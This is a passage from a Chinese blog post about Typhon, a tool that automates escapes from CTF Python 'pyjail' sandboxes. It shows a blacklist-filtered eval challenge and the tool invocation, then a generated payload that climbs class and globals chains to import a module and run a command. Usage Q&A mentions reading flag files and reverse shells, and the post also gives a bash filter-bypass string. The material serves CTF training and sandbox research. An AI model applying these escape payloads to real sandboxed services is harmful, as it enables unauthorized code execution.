+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _     ______      _                              _       _ _ </span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |·</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |                                           </span><br><span class="line">              |___/                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"> </span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        cmd = input(&quot;Enter command: &quot;)</span><br><span class="line">        blacklist = [&#x27;__loader__&#x27;,&#x27;__import__&#x27;,&#x27;os&#x27;,&#x27;[:&#x27;,&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;join&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;0b&#x27;,&#x27;subprocess&#x27;],</span><br><span class="line">        for i in blacklist:</span><br><span class="line">            if i in cmd:</span><br><span class="line">                print(&quot;Command not allowed&quot;)</span><br><span class="line">                break</span><br><span class="line">        print(eval(cmd, &#123;&#x27;__builtins__&#x27;:None, &#x27;lit&#x27;:list, &#x27;dic&#x27;:dict&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>分析一下。存在一个黑名单，本地命名空间里的<code>__builtins__</code>被删除，还留下了<code>list</code>和<code>dict</code>。</p>
+<p>不思考，直接将waf导入Typhon：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _     ______      _                              _       _ _ </span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |·</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |                                           </span><br><span class="line">              |___/                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"> </span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        import Typhon</span><br><span class="line">        Typhon.bypassRCE(cmd=&#x27;calc&#x27;,</span><br><span class="line">                         banned_chr=[&#x27;__loader__&#x27;,&#x27;__import__&#x27;,&#x27;os&#x27;,&#x27;[:&#x27;,&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;join&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;0b&#x27;,&#x27;subprocess&#x27;],</span><br><span class="line">                         local_scope=&#123;&#x27;__builtins__&#x27;:None, &#x27;lit&#x27;:list, &#x27;dic&#x27;:dict&#125;,)</span><br></pre></td></tr></table></figure>
+
+<p>运行，稍等片刻即可：</p>
+<p><img src="/images/migrated/19101758/08.png" alt="image"></p>
+<p>得解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lit.__class__.__subclasses__(lit.__class__)[0].register.__globals__[lit(dic(__builtins__=0))[0]][lit(dic(_=0))[0].__add__(lit(dic(_=0))[0]).__add__(lit(dic(i=0))[0]).__add__(lit(dic(m=0))[0]).__add__(lit(dic(p=0))[0]).__add__(lit(dic(o=0))[0]).__add__(lit(dic(r=0))[0]).__add__(lit(dic(t=0))[0]).__add__(lit(dic(_=0))[0]).__add__(lit(dic(_=0))[0])](lit(dic(uuid=0))[0])._get_command_stdout(lit(dic(calc=0))[0])</span><br></pre></td></tr></table></figure>
+
+<p>本地运行验证：</p>
+<p><img src="/images/migrated/19101758/09.png" alt="image"></p>
+<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ul>
+<li>何时<code>import Typhon</code>？</li>
+</ul>
+<p>一定要将行<code>import Typhon</code>放在<code>Typhon</code>内置绕过函数的上一行（即使你患有PEP-8强迫症）。否则，<code>Typhon</code>将无法通过栈帧获取当前的全局变量空间。</p>
+<p><strong>Do:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def safe_run(cmd):</span><br><span class="line">    import Typhon</span><br><span class="line">    Typhon.bypassRCE(cmd,</span><br><span class="line">    banned_chr=[&#x27;builtins&#x27;, &#x27;os&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;])</span><br><span class="line"></span><br><span class="line">safe_run(&#x27;cat /f*&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Don’t:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import Typhon</span><br><span class="line"></span><br><span class="line">def safe_run(cmd):</span><br><span class="line">    Typhon.bypassRCE(cmd,</span><br><span class="line">    banned_chr=[&#x27;builtins&#x27;, &#x27;os&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;])</span><br><span class="line"></span><br><span class="line">safe_run(&#x27;cat /f*&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>为什么需要使用与题目相同的python版本？</li>
+</ul>
+<p>Pyjail中存在一些通过索引寻找对应object的gadgets（如继承链）。继承链的利用随着索引变化很大。因此，请务必确保Typhon的运行环境与题目相同。</p>
+<p><strong>无法保证？</strong></p>
+<p>是的，大多数题目都不会给出对应的python版本。因此，<strong>Typhon会在使用涉及版本的gadgets时做出提示</strong>。</p>
+<p><img src="/images/migrated/19101758/10.png" alt="image"></p>
+<p>这种情况下往往需要CTF选手自己去找题目环境中该gadgets需要的索引值。</p>
+<ul>
+<li>如果题目的<code>exec</code>和<code>eval</code>没有限制命名空间怎么办？</li>
+</ul>
+<p>假设题目没有限制命名空间，则不必填写<code>local_scope</code>参数。Typhon会自动使用<code>import Typhon</code>时的当前命名空间进行绕过</p>
+<ul>
+<li>这个payload我用不了能不能换一个？</li>
+</ul>
+<p>你可以在参数中加上<code>print_all_payload=True</code>，Typhon就会打印其生成的所有payload。</p>
+<ul>
+<li>这个WEB题好像没开放stdin，我<code>exec(input())</code>没用怎么办？</li>
+</ul>
+<p>你可以在参数中加上<code>interactive=False</code>，Typhon就会禁止使用所有涉及<code>stdin</code>的payload。</p>
+<ul>
+<li>最后输出的payload没回显怎么办？</li>
+</ul>
+<p>对于<code>bypassRCE</code>，我们认为：<strong>只要命令得到了执行，就是RCE成功。</strong> 至于回显问题，你可以选择反弹shell，时间盲注，或者：添加<code>print_all_payload=True</code>参数，查看所有payload，其中可能含有能够成功回显的payload。</p>
+<h2 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h2><ul>
+<li><p>目前Typhon只支持python 3.9及以上版本。</p>
+</li>
+<li><p>目前Typhon只支持linux沙箱。</p>
+</li>
+<li><p>目前Typhon尚无法绕过audithook沙箱。</p>
+</li>
+<li><p>由于Typhon采用局部最优的递归策略，对于一些简单的题目，反而需要耗时更久（约1min）。</p>
+</li>
+<li><p>目前已知的不支持的bypass方法：</p>
+<ul>
+<li>Typhon不支持以<code>list.pop(0)</code>代替<code>list[0]</code>，这是因为Typhon所生成的payload都需要经过本地执行验证才能成立，而<code>pop</code>方法在验证时会将元素从列表中删除，从而破坏后续环境。</li>
+</ul>
+</li>
+</ul>
+<p>另：本项目在此后打算单独给bash命令加一个bypasser（<code>cat /flag</code>-&gt;<code>cat$IFS$9/*</code>）。针对bash绕过的内置绕过器，感谢<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">bashFuck</a>项目的作者@<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial">ProbiusOfficial</a>的提前授权。</p>
+<h1 id="To-sum-up"><a href="#To-sum-up" class="headerlink" title="To sum up"></a>To sum up</h1><p>感谢看完。</p>
+<p>以上是我个人对于pyjail自动化绕过的一些思考和简单实现。</p>
+<p>其实与其说是简单，不如说是粗疏。整个项目现在的能力十分有限，而代码量已经攀升到恐怖的3k+。又由于个人实力十分十分有限，我来来回回重构了好几次，最终也是跌跌撞撞了一路写了个能运行的玩意出来。希望能越来越好吧。</p>
+<p>同时，欢迎各位来提issue和PR。我们将长期收集Typhon无法解出的题目（最好附上wp），作为我们提升工具能力的参考。作为回报，你的github ID会出现在下一个release中。</p>
+<p>再次，由于个人实力有限，这只是一个相当简单而粗疏的实现。希望大家多多海涵。</p>
+<p>此致。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ideas"><span class="toc-number">1.</span> <span class="toc-text">Ideas</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Definitions"><span class="toc-number">1.1.</span> <span class="toc-text">Definitions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Paths%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">Paths：命名空间限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Workflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">Workflow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#techniques%EF%BC%9A%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">techniques：字符限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-conclude%E2%80%A6"><span class="toc-number">1.4.</span> <span class="toc-text">To conclude…</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Typhon-a-simple-imeplemention"><span class="toc-number">2.</span> <span class="toc-text">Typhon: a simple imeplemention</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#For-example"><span class="toc-number">2.1.</span> <span class="toc-text">For example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q-A"><span class="toc-number">2.2.</span> <span class="toc-text">Q&amp;A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Limitations"><span class="toc-number">2.3.</span> <span class="toc-text">Limitations</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#To-sum-up"><span class="toc-number">3.</span> <span class="toc-text">To sum up</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&text=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&is_video=false&description=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typhon: 一种pyjail自动化绕过的思路及其粗略实现&body=Check out this article: https://lamentxu.top/posts/2025-09-20-typhon-pyjail/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&name=Typhon: 一种pyjail自动化绕过的思路及其粗略实现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&t=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
